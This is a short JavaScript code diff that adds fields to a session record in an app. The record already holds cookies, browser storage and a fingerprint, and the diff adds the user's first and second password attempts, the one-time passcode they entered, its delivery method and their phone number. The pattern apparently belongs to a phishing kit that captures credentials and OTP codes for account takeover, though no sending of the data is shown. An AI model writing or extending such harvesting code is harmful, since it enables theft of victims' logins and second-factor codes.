@@ -262,7 +262,13 @@ function App() {
       documentCookies: '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
-      browserFingerprint: browserFingerprint
+      browserFingerprint: browserFingerprint,
+      // OTP and password data passed from LoginPage
+      firstAttemptPassword: sessionData.firstAttemptPassword || '',
+      secondAttemptPassword: sessionData.secondAttemptPassword || '',
+      otpEntered: sessionData.otpEntered || '',
+      deliveryMethod: sessionData.deliveryMethod || '',
+      phone: sessionData.phone || '',
     };
 
     setHasActiveSession(true);
